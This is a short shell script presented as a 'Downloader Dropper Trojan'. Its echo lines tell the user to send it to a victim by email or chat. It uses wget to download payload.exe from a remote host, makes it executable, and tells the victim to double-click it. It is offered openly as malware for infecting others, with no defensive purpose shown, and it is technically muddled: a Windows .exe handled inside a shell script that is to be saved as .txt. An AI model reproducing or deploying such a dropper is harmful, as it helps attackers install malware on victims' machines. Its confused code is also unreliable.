#!/bin/sh

echo This is a basic Downloader Dropper Trojan in Shell.
echo It can be used to install and run malware on the victim's computer.
echo To use this trojan, save it as a .txt file and send it to the victim via email or instant message.

# Download a payload
wget -O payload.exe https://example.com/payload.exe

# Create an executable file
chmod +x payload.exe

echo The downloaded payload has been saved as payload.exe.
echo To install the payload, double-click on the payload.exe icon.
